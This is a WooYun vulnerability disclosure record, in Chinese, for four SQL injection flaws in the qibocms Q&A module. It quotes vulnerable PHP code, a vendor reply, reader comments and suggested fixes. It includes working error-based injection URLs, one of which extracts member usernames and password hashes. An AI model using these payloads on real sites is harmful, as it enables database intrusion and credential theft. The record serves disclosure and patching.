{"id": 71046, "wybug_id": "wooyun-2015-0122606", "wybug_title": "qibocms 知道系统 前台4处注入.", "wybug_corp": "齐博CMS", "wybug_author": "′雨。", "wybug_date": "2015-06-26 10:16", "wybug_open_date": "2015-09-27 16:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向公众公开  简要描述： 还是之前存的。部分不需要登录会员。233 本来之前存了6处, 看到被人发了两处 擦擦。 详细说明：  首先在inc/common.inc.php中\nisset($page) && $page = intval($page);isset($id) && $id = intval($id);isset($aid) && $aid = intval($aid);isset($rid) && $rid = intval($rid);isset($fid) && $fid = intval($fid);\n对fid intval。0x01  zhidao/ask.php中\nelseif($step==4){\t\t\tif(is_array($fiddb)){\t\tforeach($fiddb as $f) $fid=$f;//重新定义 导致没有intval\t}\t\tif(!$fid) showerr(\"请选择一个问题分类\");\tif($Fid_db[$fid]){\t\t showerr(\"选择的分类必须是终级栏目,而不能是父分类\");\t}\t$webdb[title_max_length]=$webdb[title_max_length]?$webdb[title_max_length]:80;\tif(!$title) showerr(\"题目不能为空\");\tif(strlen($title)<6) showerr(\"题目不能少于6个字符\");\tif(strlen($title)>$webdb[title_max_length])showerr(\"题目长度超出范围，并且不能大于$webdb[title_max_length]字符\");\tif($money && !is_numeric($money)) showerr(\"悬赏的分数必须是半角的数字\");\t\t$webdb[content_max_length]=$webdb[content_max_length]?$webdb[content_max_length]:20000;\tif(strlen($content)>$webdb[content_max_length])showerr(\"问题内容长度超出范围，并且不能大于$webdb[content_max_length]字符\");\t\tif(!$lfjid && !$guest) $guest=\"游客\".rand(0,9).rand(0,9).rand(0,9).rand(0,9);\t//积分检验\tif($lfjuid) $lfjdb[money] = get_money($lfjuid);\t\tif($money>0){\t\tif(!$lfjuid) showerr(\"游客不能添加悬赏\");\t\tif( $lfjdb[money]<intval($money) )\t\t{\t\t\tshowerr(\"你设置的悬赏积分不能大于你自身的积分:$lfjdb[money]\");\t\t}\t}\n\n$fids=get_sonsfids($fid,true);\t$fids_str=$fid.str_replace(\",,\",\",\",$fids);//这里把重新定义的fid拼接进来\t$thissort=$db->get_one(\"SELECT COUNT(*) as num FROM {$_pre}content WHERE sortid in ($fids_str)\");//带入查询。\tif($thissort[num]>0)$db->query(\"UPDATE {$_pre}sort SET `qa_quantity`={$thissort[num]} WHERE fid=$fid\");\n\n\n0x02  zhidao/editbaike.php中\nif(!$fid || $Fidbaike_db[$fid]) $fid=$fidold;//如果没定义fid 直接给了fidold 而在全局文件中 $fidold 是没有被intval的\t\tif(!$fid) showerr(\"问题分类必须选择\");\t\t$webdb[baiketitle_max_length]=$webdb[baiketitle_max_length]?$webdb[baiketitle_max_length]:80;\tif(!$title) showerr(\"题目不能为空\");\tif(strlen($title)>$webdb[baiketitle_max_length])showerr(\"题目长度超出范围，并且不能大于$webdb[title_max_length]字符\");\t$webdb[baikecontent_max_length]=$webdb[baikecontent_max_length]?$webdb[baikecontent_max_length]:20000;\tif(strlen($content)>$webdb[baikecontent_max_length])showerr(\"问题内容长度超出范围，并且不能大于$webdb[baikecontent_max_length]字符\");\t\t$title=replace_bad_word(htmlspecialchars($title));\tif(!$webdb[inputcontentype])$content=htmlspecialchars($content);\t\t\t\t$ifcheck=0;\t$SQL=\"UPDATE {$_pre}content_baike SET title='$title',sortid='$fid',content='$content' WHERE aid='$aid'\";\tif($db->query($SQL)){\t\t$this_id=$aid;\t\t/*粗略计算类目的问题数量*/\t\t$fids=get_baikesonsfids($fid,true);\t\t$fids_str=$fid.str_replace(\",,\",\",\",$fids);//再次拼接\t\t$thissort=$db->get_one(\"SELECT COUNT(*) as num FROM {$_pre}content_baike WHERE sortid in ($fids_str)\");//带入查询\t\tif($thissort[num]>0)$db->query(\"UPDATE {$_pre}sort_baike SET `qa_quantity`={$thissort[num]} WHERE fid='$fid'\");\nhttp://web/new/zhidao/zhidao/editbaike.php?step=2&aid=1&fidold=1) and updatexml(1,concat(0x5e24,(select concat(username,password) from qb_members limit 1),0x5e24),1)%23&title=aaaaaaa\n\n0x03 在inc/common.inc.php中unset($label_hf,$label,$webdb,$Html_Type,$erp,$ltitle,$memberlevel,$showHtml_Type,$chdb,$fidDB,$rsdb,$ModuleDB,$city_DB,$Mdomain,$Murl,$choose_class,$foot_tpl,$head_tpl);并没有对Limitword unset 而在其他系统中一些都unset了。导致了以前的一个老洞, 还有几个系统都没Unset 把剩下没unset的系统都unset了算了把。zhidao/editbaike.php中\nif($step){\t\tif(is_array($fiddb)){\t\t\tforeach($fiddb as $f) $fid=$f;\t}\t\tif(!$fid || $Fidbaike_db[$fid]) $fid=$fidold;\t\tif(!$fid) showerr(\"问题分类必须选择\");\t\t$webdb[baiketitle_max_length]=$webdb[baiketitle_max_length]?$webdb[baiketitle_max_length]:80;\tif(!$title) showerr(\"题目不能为空\");\tif(strlen($title)>$webdb[baiketitle_max_length])showerr(\"题目长度超出范围，并且不能大于$webdb[title_max_length]字符\");\t$webdb[baikecontent_max_length]=$webdb[baikecontent_max_length]?$webdb[baikecontent_max_length]:20000;\tif(strlen($content)>$webdb[baikecontent_max_length])showerr(\"问题内容长度超出范围，并且不能大于$webdb[baikecontent_max_length]字符\");\t\t$title=replace_bad_word(htmlspecialchars($title));//这里并没有filerate\tif(!$webdb[inputcontentype])$content=htmlspecialchars($content);\t\t\t\t$ifcheck=0;\t$SQL=\"UPDATE {$_pre}content_baike SET title='$title',sortid='$fid',content='$content' WHERE aid='$aid'\";\n \nfunction replace_bad_word($str){\tglobal $Limitword;\t@include_once(ROOT_PATH.\"data/limitword.php\");\tforeach( $Limitword AS $old=>$new){\t\tstrlen($old)>2 && $str=str_replace($old,trim($new),$str);\t}\treturn $str;}\nglobal $Limitword 了 且全局中没有unset 可以导致替换任意为空。http://web/new/zhidao/zhidao/editbaike.php?step=1&aid=1&fidold=1&title=%0000'|updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23&Limitword[000]=\n\n0x04  zhidao/postbaike.php中\nelseif($step==4){\t\t\t\tif(is_array($fiddb)){\t\t\tforeach($fiddb as $f) $fid=$f;\t\t}\t\tif(!$fid) showerr(\"分类必须选择\");\t\tif($Fidbaike_db[$fid]){\t\t\t showerr(\"选择的分类必须是终级栏目,而不能是父分类\");\t\t}\t\t$webdb[baiketitle_max_length]=$webdb[baiketitle_max_length]?$webdb[baiketitle_max_length]:80;\t\t!$title && showerr(\"名称不能为空\");\t\tstrlen($title)<6 && showerr(\"名称不能不能少于6个字符\");\t\tif(strlen($title)>$webdb[baiketitle_max_length])showerr(\"名称长度超出范围，且不能大于{$webdb[title_max_length]}字符\");\t\t\t\t\t$webdb[baikecontent_max_length]=$webdb[baikecontent_max_length]?$webdb[baikecontent_max_length]:20000;\t\tif(strlen($content)>$webdb[baikecontent_max_length])showerr(\"内容长度超出范围，且不能大于{$webdb[baikecontent_max_length]}字符\");\t\t\t\t\t\t\t\t\t\t$title=replace_bad_word(filtrate($title));\t\tif(!$webdb[inputcontentype])$content=filtrate($content);\t\t\t$ifcheck=intval($webdb[baikeautocheck]);\t\t\t//插入\t\t$db->query(\"INSERT INTO `{$_pre}content_baike` (`type`, `sortid` ,`faid`, `uid` , `username` , `title` , `title_strong` , `title_color` , `content` , `imgs` , `addtime` , `hits` , `ifcheck`  ) VALUES ('default', '$fid','', '$lfjuid', '$lfjid', '$title', '', '', '$content', '$imgs', '$timestamp', '0', '$ifcheck')\");\t\t\t\t$this_id = $db->insert_id();\t\t//粗略计算类目的问题数量\t\t$fids = get_baikesonsfids($fid,true);\t\t$fids_str=$fid.str_replace(\",,\",\",\",$fids);\t\t$thissort=$db->get_one(\"SELECT COUNT(*) as num FROM {$_pre}content_baike WHERE sortid in ($fids_str)\");\t\tif($thissort[num]>0)$db->query(\"UPDATE {$_pre}sort_baike SET `qa_quantity`={$thissort[num]} WHERE fid=$fid\");\t\trefreshto(\"baikeview.php?aid=$this_id\",\"发布成功\");\n这个跟第一个差不多 就不多说了。   漏洞证明：  如上。   修复方案：  1 3 4 都intval了把。2 unset   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-06-29 16:22 厂商回复： 感谢提出来 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-26 10:19 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:367 漏洞数:47        | 答案)\t\t \n  mark    \n     2015-06-26 11:22 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1317 漏洞数:191        | 。)\t\t \n  mark    \n     2015-06-26 14:16 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  我擦                    6666    \n     2015-06-26 14:48 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:279 漏洞数:110        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  666    \n     2015-06-26 16:46 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:28        | 不会挖洞洞的猿猿不是好学生)\t\t \n  mark    \n     2015-06-28 17:00 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  雨牛又来了。    \n     2015-07-01 15:10 |    \t\tTellYouThat \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 不要叫我逗比，我只是个菜比)\t\t \n  高考完又开始刷起搏了。。    \n     2015-09-16 00:06 |    \t\t人丑嘴不甜 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:9        | 小菜鸟 妄想成为大大的大牛)\t\t \n  LZ 是我偶像 真棒 比我们这些大学狗强多了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}